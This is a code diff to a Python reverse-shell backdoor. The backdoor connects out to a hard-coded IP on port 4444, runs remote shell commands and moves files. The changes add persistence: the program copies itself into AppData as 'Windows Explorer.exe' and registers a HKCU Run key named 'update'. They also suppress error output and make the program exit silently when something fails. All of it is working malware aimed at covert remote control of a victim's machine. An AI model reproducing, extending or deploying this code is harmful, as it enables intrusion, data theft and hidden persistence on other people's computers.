@@ -5,17 +5,25 @@ import subprocess
 import json
 import os
 import base64
-
+import sys
+import shutil
 
 
 class Backdoor:
     def __init__(self, ip, port):
+        self.auto_start()
         self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
 
     def json_send(self, data):
         json_data = json.dumps(data)
         self.connection.send(json_data.encode())
+
+    def auto_start(self):
+        file_loc = os.environ["appdata"] + "\\Windows Explorer.exe"
+        if not os.path.exists(file_loc):
+            shutil.copyfile(sys.executable, file_loc)
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + file_loc + '"', shell=True)
 
     def json_recieve(self):
         json_data = b""
@@ -29,7 +37,7 @@ class Backdoor:
                 continue
 
     def exc(self, command):
-        return subprocess.check_output(command, shell=True).decode()
+        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode()
 
     def change_dir(self, path):
         os.chdir(path)
@@ -52,14 +60,14 @@ class Backdoor:
             return "0"
 
     def run(self):
-        com = self.json_recieve()
+        '''com = self.json_recieve()
         com = com.split("\n\n")
         if com[1]:
             uph = self.write_files(com[0], com[1])
             required_value = subprocess.check_output("python " + com[0], shell=True).decode()
             required_value = base64.b64encode(required_value.encode())
             self.json_send(required_value.decode())
-            os.remove(com[0])
+            os.remove(com[0])'''
 
         while True:
             try:
@@ -68,7 +76,7 @@ class Backdoor:
                     command_result = os.getcwd()
                 elif command == "exit":
                     self.connection.close()
-                    exit()
+                    sys.exit()
                 elif command[0:3] == "cd " and len(command) > 3:
                     command_result = self.change_dir(command[3:])
                 elif command[0:8] == "download":
@@ -85,10 +93,10 @@ class Backdoor:
                 self.json_send("[-] Invalid Command")
             except FileNotFoundError:
                 self.json_send("[-] Directory Not Found")
-            except ConnectionAbortedError:
-                time.sleep(60)
-                self.run()
 
 
-my_backdoor = Backdoor("192.168.43.238", 4444)
-my_backdoor.run()
+try:
+    my_backdoor = Backdoor("192.168.43.142", 4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
